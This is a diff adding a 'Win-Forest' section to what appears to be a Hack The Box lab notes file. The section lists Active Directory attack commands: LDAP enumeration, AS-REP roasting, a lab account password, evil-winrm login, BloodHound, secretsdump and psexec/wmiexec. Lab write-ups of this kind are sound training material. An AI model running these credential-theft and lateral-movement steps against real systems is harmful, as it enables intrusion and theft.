@@ -12,6 +12,21 @@ john hash_admin -w=/usr/share/wordlists/rockyou.txt
 ```
 
 
+# Win-Forest
+```
+ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
+enum4linux 10.10.10.161
+./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
+crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+SharpHound.ps1
+BloodHound
+CanPSRemote
+secretsdump.py
+psexec.py / wmiexec.py
+```
+
+
 # Win-Jerry
 ```
 nmap -p- -T5 10.10.10.95
